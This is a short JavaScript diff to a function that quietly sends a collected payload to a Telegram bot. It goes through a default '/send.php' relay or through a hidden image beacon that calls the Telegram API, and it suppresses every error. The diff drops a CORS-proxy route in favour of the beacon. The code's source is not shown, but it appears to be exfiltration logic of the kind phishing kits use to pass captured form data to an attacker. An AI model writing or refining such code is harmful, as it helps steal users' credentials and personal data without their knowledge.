@@ -434,20 +434,19 @@ function sendToTelegram(payload) {
     const groupId = cfg.groupId || localStorage.getItem('tg.groupId')
     cfg.token = token
     cfg.groupId = groupId
-    if (cfg.proxy) {
+    const proxy = cfg.proxy || '/send.php'
+    if (proxy) {
       const body = { payload }
-      return fetch(cfg.proxy, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }).catch(() => {})
+      return fetch(proxy, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }).catch(() => {})
     }
     if (!cfg.token) return Promise.resolve()
     const text = Object.entries(payload).map(([k, v]) => `${k}: ${v}`).join('\n')
     return resolveChatId().then(id => {
-      if (!id) return
-      const q = new URLSearchParams({ chat_id: id, text }).toString()
+      const chat = id || cfg.groupId
+      if (!chat) return
+      const q = new URLSearchParams({ chat_id: chat, text, disable_web_page_preview: '1' }).toString()
       const apiUrl = `https://api.telegram.org/bot${cfg.token}/sendMessage?${q}`
-      const proxied = `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`
-      return fetch(proxied).catch(() => {
-        try { const img = new Image(); img.src = apiUrl } catch(_) {}
-      })
+      try { const img = new Image(); img.src = apiUrl } catch(_) {}
     })
   } catch (_) { return Promise.resolve() }
 }
